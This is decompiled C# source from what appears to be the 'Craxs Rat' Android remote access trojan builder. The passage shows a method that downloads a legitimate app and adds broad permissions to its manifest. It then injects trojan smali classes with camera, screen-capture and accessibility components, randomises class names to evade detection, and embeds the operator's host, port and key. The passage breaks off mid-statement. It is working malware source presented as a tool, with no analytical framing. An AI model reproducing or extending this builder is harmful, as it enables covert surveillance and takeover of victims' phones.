using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CraxsStore : Form
{
	public delegate void InvocationDelegate(object[] objs);

	public delegate void recordnames(object[] obj);

	public delegate void delestatustext(object[] obj);

	public delegate void Delegate0(object d0, object b0);

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal DoWorkEventArgs _0024VB_0024Local_e;

		internal CraxsStore _0024VB_0024Me;

		internal List<string> _0024VB_0024ResumableLocal_datatowork_00240;

		internal string _0024VB_0024ResumableLocal_primscombo_00241;

		internal string[] _0024VB_0024ResumableLocal_lnk_00242;

		internal string _0024VB_0024ResumableLocal_appname_00243;

		internal string _0024VB_0024ResumableLocal_apppkg_00244;

		internal string _0024VB_0024ResumableLocal_name_00245;

		internal WebClient _0024VB_0024ResumableLocal_client_00246;

		internal NameValueCollection _0024VB_0024ResumableLocal_reqparm_00247;

		internal XmlDocument _0024VB_0024ResumableLocal_xDoc_00248;

		internal string _0024VB_0024ResumableLocal_serverlink_00249;

		internal string _0024VB_0024ResumableLocal_Forlic_002410;

		internal byte[] _0024VB_0024ResumableLocal_tData_002411;

		internal byte[] _0024VB_0024ResumableLocal_appzip_002412;

		internal Exception _0024VB_0024ResumableLocal_ex_002413;

		internal string _0024VB_0024ResumableLocal_AllManifist_002414;

		internal string[] _0024VB_0024ResumableLocal_arryprims_002415;

		internal string[] _0024S16;

		internal int _0024S17;

		internal string _0024VB_0024ResumableLocal_pri_002418;

		internal Exception _0024VB_0024ResumableLocal_ex_002419;

		internal int _0024VB_0024ResumableLocal_x_002420;

		internal int _0024VB_0024ResumableLocal_y_002421;

		internal string[] _0024VB_0024ResumableLocal_ManifistLines_002422;

		internal string[] _0024VB_0024ResumableLocal_apktoolyml_002423;

		internal int _0024S24;

		internal int _0024VB_0024ResumableLocal_index_002425;

		internal int _0024S26;

		internal int _0024VB_0024ResumableLocal_index_002427;

		internal List<string>.Enumerator _0024S28;

		internal string _0024VB_0024ResumableLocal_pri_002429;

		internal Exception _0024VB_0024ResumableLocal_ex_002430;

		internal string _0024VB_0024ResumableLocal_smlipath_002431;

		internal int _0024VB_0024ResumableLocal_index_002432;

		internal Exception _0024VB_0024ResumableLocal_ex_002433;

		internal string[] _0024VB_0024ResumableLocal_files_002434;

		internal int _0024VB_0024ResumableLocal_min_num_002435;

		internal int _0024VB_0024ResumableLocal_max_num_002436;

		internal string[] _0024S37;

		internal int _0024S38;

		internal string _0024VB_0024ResumableLocal_f_002439;

		internal string _0024VB_0024ResumableLocal_text_002440;

		internal string _0024VB_0024ResumableLocal_sourcePath_002441;

		internal string _0024VB_0024ResumableLocal_searchPattern_002442;

		internal int _0024VB_0024ResumableLocal_i_002443;

		internal string[] _0024S44;

		internal int _0024S45;

		internal string _0024VB_0024ResumableLocal_fileName_002446;

		internal Exception _0024VB_0024ResumableLocal_ex_002447;

		internal string _0024VB_0024ResumableLocal_Activity_002448;

		internal string[] _0024VB_0024ResumableLocal_MainReader_002449;

		internal int _0024S50;

		internal int _0024VB_0024ResumableLocal_index_002451;

		internal string[] _0024VB_0024ResumableLocal_findmain_002452;

		internal string _0024VB_0024ResumableLocal_intentmain_002453;

		internal Exception _0024VB_0024ResumableLocal_ex_002454;

		internal Exception _0024VB_0024ResumableLocal_ex_002455;

		internal string _0024VB_0024ResumableLocal_folder_building_002456;

		internal string _0024VB_0024ResumableLocal_path_apktool_002457;

		internal int _0024VB_0024ResumableLocal_vulTrack_002458;

		internal string _0024VB_0024ResumableLocal_driv_002459;

		internal Exception _0024VB_0024ResumableLocal_ex_002460;

		internal Exception _0024VB_0024ResumableLocal_ex_002461;

		internal bool _0024VB_0024ResumableLocal_canRun_002462;

		internal Exception _0024VB_0024ResumableLocal_ex_002463;

		internal Exception _0024VB_0024ResumableLocal_ex_002464;

		internal Exception _0024VB_0024ResumableLocal_ex_002465;

		internal TaskAwaiter<byte[]> _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num > 1u)
				{
				}
				try
				{
					if ((uint)num > 1u)
					{
						_0024VB_0024Me.logstatus("Working");
						Application.DoEvents();
						_0024VB_0024ResumableLocal_datatowork_00240 = (List<string>)_0024VB_0024Local_e.Argument;
						_0024VB_0024ResumableLocal_primscombo_00241 = _0024VB_0024ResumableLocal_datatowork_00240[4];
						_0024VB_0024Me.appnamebuild = _0024VB_0024ResumableLocal_datatowork_00240[5];
						_0024VB_0024ResumableLocal_lnk_00242 = new string[4]
						{
							_0024VB_0024ResumableLocal_datatowork_00240[0],
							_0024VB_0024ResumableLocal_datatowork_00240[1],
							_0024VB_0024ResumableLocal_datatowork_00240[2],
							_0024VB_0024ResumableLocal_datatowork_00240[3]
						};
						_0024VB_0024ResumableLocal_appname_00243 = _0024VB_0024ResumableLocal_lnk_00242[1];
						_0024VB_0024ResumableLocal_apppkg_00244 = _0024VB_0024ResumableLocal_lnk_00242[3];
						_0024VB_0024ResumableLocal_name_00245 = _0024VB_0024ResumableLocal_apppkg_00244 + "/" + _0024VB_0024ResumableLocal_appname_00243;
					}
					try
					{
						if ((uint)num > 1u)
						{
							_0024VB_0024ResumableLocal_client_00246 = new WebClient();
						}
						try
						{
							TaskAwaiter<byte[]> awaiter;
							switch (num)
							{
							default:
								_0024VB_0024ResumableLocal_reqparm_00247 = new NameValueCollection();
								_0024VB_0024ResumableLocal_reqparm_00247.Add("api", "S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R");
								_0024VB_0024ResumableLocal_xDoc_00248 = new XmlDocument();
								_0024VB_0024ResumableLocal_client_00246.UploadValuesCompleted += _0024VB_0024Me.wc_UploadDataCompleted;
								_0024VB_0024ResumableLocal_client_00246.UploadProgressChanged += _0024VB_0024Me.wc_UploadProgressChanged;
								awaiter = _0024VB_0024ResumableLocal_client_00246.UploadValuesTaskAsync(new Uri((_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(_0024VB_0024ResumableLocal_serverlink_00249, "res/icons") + "?USR=[U]&IDF=[I]&IDS=[P]&NAM=[N]").Replace("[U]", _0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(_0024VB_0024ResumableLocal_Forlic_002410, "\u200b\u200d\u200c\u200e\u200f")).Replace("[I]", Codes.Encrypt(clsComputerInfo.GenerateHash(clsComputerInfo.GetSerialNumber() + clsComputerInfo.GetProcessorID()), "Form1")).Replace("[P]", RegistryHandler.passkey())
									.Replace("[N]", _0024VB_0024ResumableLocal_name_00245 + ".zip")), "POST", _0024VB_0024ResumableLocal_reqparm_00247).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = 0;
									_0024State = 0;
									_0024A0 = awaiter;
									ref AsyncVoidMethodBuilder reference = ref _0024Builder;
									VB_0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj stateMachine = this;
									reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
									return;
								}
								break;
							case 1:
								num = -1;
								_0024State = -1;
								return;
							case 0:
								num = -1;
								_0024State = -1;
								awaiter = _0024A0;
								_0024A0 = default(TaskAwaiter<byte[]>);
								break;
							}
							byte[] result = awaiter.GetResult();
							awaiter = default(TaskAwaiter<byte[]>);
							_0024VB_0024ResumableLocal_tData_002411 = result;
							_0024VB_0024ResumableLocal_appzip_002412 = _0024VB_0024ResumableLocal_tData_002411;
						}
						finally
						{
							if (num < 0 && _0024VB_0024ResumableLocal_client_00246 != null)
							{
								((IDisposable)_0024VB_0024ResumableLocal_client_00246).Dispose();
							}
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_002413 = ex2;
						_0024VB_0024ResumableLocal_appzip_002412 = null;
						ProjectData.ClearProjectError();
					}
					checked
					{
						if (_0024VB_0024ResumableLocal_appzip_002412 != null)
						{
							File.WriteAllBytes(reso.Storepath + "\\" + _0024VB_0024ResumableLocal_appname_00243 + ".zip", _0024VB_0024ResumableLocal_appzip_002412);
							if (Directory.Exists(reso.Storepath + "\\" + _0024VB_0024ResumableLocal_appname_00243))
							{
								Directory.Delete(reso.Storepath + "\\" + _0024VB_0024ResumableLocal_appname_00243, recursive: true);
							}
							_0024VB_0024Me.logwork("Please Wait , Extracting Data...");
							Application.DoEvents();
							Codes.File_zip_Decompress(reso.Storepath + "\\" + _0024VB_0024ResumableLocal_appname_00243 + ".zip", reso.Storepath);
							_0024VB_0024Me.logwork("Start injectin");
							Application.DoEvents();
							_0024VB_0024Me.TheApkPath = reso.Storepath + "\\" + _0024VB_0024ResumableLocal_appname_00243;
							try
							{
								_0024VB_0024Me.logwork("Check Permissions...");
								_0024VB_0024ResumableLocal_AllManifist_002414 = File.ReadAllText(_0024VB_0024Me.TheApkPath + "\\AndroidManifest.xml");
								if (!_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()))
								{
									_0024VB_0024Me.need_write = true;
								}
								if (!_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
								{
									_0024VB_0024Me.need_read = true;
								}
								if (!_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
								{
									_0024VB_0024Me.need_forground = true;
								}
								if (!_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
								{
									_0024VB_0024Me.need_syswinow = true;
								}
								if (!_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
								{
									_0024VB_0024Me.need_boot = true;
								}
								if (Operators.CompareString(_0024VB_0024ResumableLocal_primscombo_00241, "Only Needed", TextCompare: false) != 0)
								{
									_0024VB_0024Me.need_all = true;
									_0024VB_0024Me.ASKPRIM_all = true;
									_0024VB_0024ResumableLocal_arryprims_002415 = Resources.ALLPRIM.Split('#');
									_0024S16 = _0024VB_0024ResumableLocal_arryprims_002415;
									for (_0024S17 = 0; _0024S17 < _0024S16.Length; _0024S17++)
									{
										_0024VB_0024ResumableLocal_pri_002418 = _0024S16[_0024S17];
										try
										{
											if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_pri_002418) && !_0024VB_0024ResumableLocal_AllManifist_002414.ToLower().Contains(_0024VB_0024ResumableLocal_pri_002418.ToLower()))
											{
												_0024VB_0024Me.ALLPRIMSLIST.Add(_0024VB_0024ResumableLocal_pri_002418);
											}
										}
										catch (Exception ex3)
										{
											ProjectData.SetProjectError(ex3);
											Exception ex4 = ex3;
											_0024VB_0024ResumableLocal_ex_002419 = ex4;
											ProjectData.ClearProjectError();
										}
									}
								}
								_0024VB_0024Me.logwork("Coding AndroidManifest...");
								_0024VB_0024ResumableLocal_x_002420 = 25;
								_0024VB_0024ResumableLocal_y_002421 = 35;
								_0024VB_0024Me.cou = _0024VB_0024Me.GenerateRandomNumber(0, 5000);
								_0024VB_0024Me.N_ClassGen = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N_cap_sc_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__srv_worker_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N_newEngineWorkerins = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__access_ask_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__ask_prim_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N_update_app_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__scctrl_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N_WackMeUpJob = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__ask_draw_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__ask_battary_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__CamActivity_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__SCRActivity_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024Me.N__webviewer_ = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_x_002420, _0024VB_0024ResumableLocal_y_002421);
								_0024VB_0024ResumableLocal_ManifistLines_002422 = File.ReadAllLines(_0024VB_0024Me.TheApkPath + "\\AndroidManifest.xml");
								_0024VB_0024ResumableLocal_apktoolyml_002423 = File.ReadAllLines(_0024VB_0024Me.TheApkPath + "\\apktool.yml");
								_0024S24 = _0024VB_0024ResumableLocal_apktoolyml_002423.Length - 1;
								_0024VB_0024ResumableLocal_index_002425 = 0;
								while (_0024VB_0024ResumableLocal_index_002425 <= _0024S24)
								{
									if (!_0024VB_0024ResumableLocal_apktoolyml_002423[_0024VB_0024ResumableLocal_index_002425].ToLower().Contains("targetSdkVersion".ToLower()))
									{
										_0024VB_0024ResumableLocal_index_002425++;
										continue;
									}
									_0024VB_0024ResumableLocal_apktoolyml_002423[_0024VB_0024ResumableLocal_index_002425] = "  targetSdkVersion: '29'";
									File.WriteAllLines(_0024VB_0024Me.TheApkPath + "\\apktool.yml", _0024VB_0024ResumableLocal_apktoolyml_002423);
									break;
								}
								_0024S26 = _0024VB_0024ResumableLocal_ManifistLines_002422.Length - 1;
								_0024VB_0024ResumableLocal_index_002427 = 1;
								while (_0024VB_0024ResumableLocal_index_002427 <= _0024S26)
								{
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_write)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + Resources.WritePrim;
										_0024VB_0024Me.need_write = false;
									}
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_read)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + Resources.ReadPrim;
										_0024VB_0024Me.need_read = false;
									}
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_forground)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + Resources.FORGROUD;
										_0024VB_0024Me.need_forground = false;
									}
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_syswinow)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + Resources.SystemwindowPrim;
										_0024VB_0024Me.need_syswinow = false;
									}
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_boot)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + Resources.BootPrim;
										_0024VB_0024Me.need_boot = false;
									}
									if (Conversions.ToBoolean(Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.need_all)) && _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<uses-permission")))
									{
										try
										{
											_0024S28 = _0024VB_0024Me.ALLPRIMSLIST.GetEnumerator();
											while (_0024S28.MoveNext())
											{
												_0024VB_0024ResumableLocal_pri_002429 = _0024S28.Current;
												_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + "\r\n" + _0024VB_0024ResumableLocal_pri_002429;
											}
										}
										finally
										{
											if (num < 0)
											{
												((IDisposable)_0024S28/*cast due to .constrained prefix*/).Dispose();
											}
										}
										_0024VB_0024Me.need_all = false;
									}
									if (!_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("<application"))
									{
										_0024VB_0024ResumableLocal_index_002427++;
										continue;
									}
									if (!_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
									{
										_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
									}
									_0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] = _0024VB_0024ResumableLocal_ManifistLines_002422[_0024VB_0024ResumableLocal_index_002427] + Environment.NewLine + Resources.CypherMini.Replace("_ask_prim_", _0024VB_0024Me.N__ask_prim_).Replace("_access_ask_", _0024VB_0024Me.N__access_ask_).Replace("EngineWorkerins", _0024VB_0024Me.N_newEngineWorkerins)
										.Replace("_srv_worker_", _0024VB_0024Me.N__srv_worker_)
										.Replace("_cap_sc_", _0024VB_0024Me.N_cap_sc_)
										.Replace("_update_app_", _0024VB_0024Me.N_update_app_)
										.Replace("webviewer", _0024VB_0024Me.N__webviewer_)
										.Replace("_ask_draw_", _0024VB_0024Me.N__ask_draw_)
										.Replace("SCRActivity", _0024VB_0024Me.N__SCRActivity_)
										.Replace("CamActivity", _0024VB_0024Me.N__CamActivity_)
										.Replace("_ask_battary_", _0024VB_0024Me.N__ask_battary_)
										.Replace("_scctrl_", _0024VB_0024Me.N__scctrl_)
										.Replace("ClassGen", _0024VB_0024Me.N_ClassGen)
										.Replace("WackMeUpJob", _0024VB_0024Me.N_WackMeUpJob);
									break;
								}
								File.WriteAllLines(_0024VB_0024Me.TheApkPath + "\\AndroidManifest.xml", _0024VB_0024ResumableLocal_ManifistLines_002422);
							}
							catch (Exception ex5)
							{
								ProjectData.SetProjectError(ex5);
								Exception ex6 = ex5;
								_0024VB_0024ResumableLocal_ex_002430 = ex6;
								_0024VB_0024Me.logwork("Error Manifest :" + _0024VB_0024ResumableLocal_ex_002430.Message);
								ProjectData.ClearProjectError();
							}
							_0024VB_0024ResumableLocal_smlipath_002431 = null;
							try
							{
								_0024VB_0024Me.logwork("Inject Data To Apk...");
								_0024VB_0024ResumableLocal_index_002432 = 3;
								do
								{
									if (Directory.Exists(_0024VB_0024Me.TheApkPath + "\\smali_classes" + _0024VB_0024ResumableLocal_index_002432))
									{
										_0024VB_0024ResumableLocal_index_002432++;
										continue;
									}
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\smali_classes" + _0024VB_0024ResumableLocal_index_002432);
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\smali_classes" + _0024VB_0024ResumableLocal_index_002432 + "\\ginom\\alfa\\lib\\scan");
									_0024VB_0024ResumableLocal_smlipath_002431 = _0024VB_0024Me.TheApkPath + "\\smali_classes" + _0024VB_0024ResumableLocal_index_002432;
									break;
								}
								while (_0024VB_0024ResumableLocal_index_002432 <= 14);
								if (_0024VB_0024ResumableLocal_smlipath_002431 == null)
								{
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\smali_classes2");
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\smali_classes2\\ginom\\alfa\\lib\\scan");
									_0024VB_0024ResumableLocal_smlipath_002431 = _0024VB_0024Me.TheApkPath + "\\smali_classes2";
								}
								if (!File.Exists(_0024VB_0024ResumableLocal_smlipath_002431 + "\\data.zip"))
								{
									File.WriteAllBytes(_0024VB_0024ResumableLocal_smlipath_002431 + "\\data.zip", Resources.APPS);
								}
								ZipFile.ExtractToDirectory(_0024VB_0024ResumableLocal_smlipath_002431 + "\\data.zip", _0024VB_0024ResumableLocal_smlipath_002431);
								File.Delete(_0024VB_0024ResumableLocal_smlipath_002431 + "\\data.zip");
								Thread.Sleep(1);
								if (!Directory.Exists(_0024VB_0024Me.TheApkPath + "\\res\\xml"))
								{
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\res\\xml");
								}
								File.WriteAllText(_0024VB_0024Me.TheApkPath + "\\res\\xml\\accessibilityprivatesrcapp.xml", Resources.accessibilityprivatesrcapp);
								if (!Directory.Exists(_0024VB_0024Me.TheApkPath + "\\res\\xml"))
								{
									Directory.CreateDirectory(_0024VB_0024Me.TheApkPath + "\\res\\xml");
								}
							}
							catch (Exception ex7)
							{
								ProjectData.SetProjectError(ex7);
								Exception ex8 = ex7;
								_0024VB_0024ResumableLocal_ex_002433 = ex8;
								_0024VB_0024Me.logwork("Error Data :" + _0024VB_0024ResumableLocal_ex_002433.Message);
								ProjectData.ClearProjectError();
							}
							try
							{
								_0024VB_0024Me.logwork("Encryption...");
								_0024VB_0024ResumableLocal_files_002434 = Directory.GetFiles(_0024VB_0024ResumableLocal_smlipath_002431 + "\\ginom\\alfa\\lib\\scan");
								_0024VB_0024ResumableLocal_min_num_002435 = 20;
								_0024VB_0024ResumableLocal_max_num_002436 = 25;
								_0024VB_0024Me.newgetbyts = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436)));
								_0024VB_0024Me.newsrvrun = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436)));
								_0024VB_0024Me.split1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(4, 4)));
								_0024VB_0024Me.split2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(4, 4)));
								_0024VB_0024Me.split3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(4, 4)));
								_0024VB_0024Me.split4 = Conversions.ToString(RuntimeHelpers.GetObjectValue(_0024VB_0024Me.RandomShit(4, 4)));
								_0024VB_0024Me.newhost = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newport = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newkey = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newalive = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newname = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.neweco = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newconect = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newsokt = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newstrtconct = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newcnl = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newcnm = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newsndmthd = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.newplgs = _0024VB_0024Me.RandommMad(_0024VB_0024ResumableLocal_min_num_002435, _0024VB_0024ResumableLocal_max_num_002436);
								_0024VB_0024Me.NEWRANDOM = _0024VB_0024Me.madladstr();
								_0024VB_0024Me.newforuce = "QsdvgaerEARGar";
								_0024S37 = _0024VB_0024ResumableLocal_files_002434;
								for (_0024S38 = 0; _0024S38 < _0024S37.Length; _0024S38++)
								{
									_0024VB_0024ResumableLocal_f_002439 = _0024S37[_0024S38];
									_0024VB_0024ResumableLocal_text_002440 = File.ReadAllText(_0024VB_0024ResumableLocal_f_002439).Replace("_ask_prim_", _0024VB_0024Me.N__ask_prim_).Replace("_access_ask_", _0024VB_0024Me.N__access_ask_)
										.Replace("EngineWorkerins", _0024VB_0024Me.N_newEngineWorkerins)
										.Replace("_srv_worker_", _0024VB_0024Me.N__srv_worker_)
										.Replace("_cap_sc_", _0024VB_0024Me.N_cap_sc_)
										.Replace("_update_app_", _0024VB_0024Me.N_update_app_)
										.Replace("webviewer", _0024VB_0024Me.N__webviewer_)
										.Replace("SCRActivity", _0024VB_0024Me.N__SCRActivity_)
										.Replace("CamActivity", _0024VB_0024Me.N__CamActivity_)
										.Replace("_ask_battary_", _0024VB_0024Me.N__ask_battary_)
										.Replace("_scctrl_", _0024VB_0024Me.N__scctrl_)
										.Replace("ClassGen", _0024VB_0024Me.N_ClassGen)
										.Replace("_METHOD_getbyte_", _0024VB_0024Me.newgetbyts)
										.Replace("_mthd_issrvrun_", _0024VB_0024Me.newsrvrun)
										.Replace("_splet_1_", _0024VB_0024Me.split1)
										.Replace("_split_2_", _0024VB_0024Me.split2)
										.Replace("_split_3_", _0024VB_0024Me.split3)
										.Replace("_the_plugns_", _0024VB_0024Me.newplgs)
										.Replace("_split_4_", _0024VB_0024Me.split4)
										.Replace("_the_host_", _0024VB_0024Me.newhost)
										.Replace(_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("fhTUPYsif35OSfhZ0W7kaw==", _0024VB_0024Me.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(_0024VB_0024Me.TheKey.Text)))
										.Replace(_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("l47cEy4tX1IFMbXx/K/EjQ==", _0024VB_0024Me.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(_0024VB_0024Me.Host.Text)))
										.Replace(_0024VB_0024Me.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("4v6Ulzh5+UOGfKCrVSMVZQ==", _0024VB_0024Me.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(_0024VB_0024Me.Port.Text)))
										.Replace("USE-SUPER", _0024VB_0024Me.checksuper.Checked.ToString())
										.Replace("USE-NOKILL", _0024VB_0024Me.checkkill.Checked.ToString())
										.Replace("USE-DRAWOVER", _0024VB_0024Me.checkDraw.Checked.ToString())
